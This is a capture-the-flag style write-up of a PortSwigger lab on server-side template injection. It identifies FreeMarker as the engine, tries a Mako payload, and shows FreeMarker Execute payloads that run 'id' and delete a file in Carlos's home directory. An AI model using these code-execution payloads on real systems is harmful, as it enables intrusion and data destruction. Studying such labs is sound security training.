
# Server-side template injection using documentation

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r

Hint: You should try solving this lab using only the documentation. However, if you get really stuck, you can try finding a well-known exploit by @albinowax that you can use to solve the lab.

---------------------------------------------

References: 

- https://portswigger.net/web-security/server-side-template-injection/exploiting

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker



![img](images/Server-side%20template%20injection%20using%20documentation/1.png)

---------------------------------------------

It is possible to edit the templates of the posts:



![img](images/Server-side%20template%20injection%20using%20documentation/2.png)


We find there are values calculated with the format "${product.X}":



![img](images/Server-side%20template%20injection%20using%20documentation/3.png)


We can execute for example this payload:

```
${3*3}
```



![img](images/Server-side%20template%20injection%20using%20documentation/4.png)


I tried the Mako's payload from the example and generated an error:

```
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
```



![img](images/Server-side%20template%20injection%20using%20documentation/5.png)


The payload format is:

```
${"freemarker.template.utility.Execute"?new()("id")}
```



![img](images/Server-side%20template%20injection%20using%20documentation/6.png)


Payload to delete the file:

```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```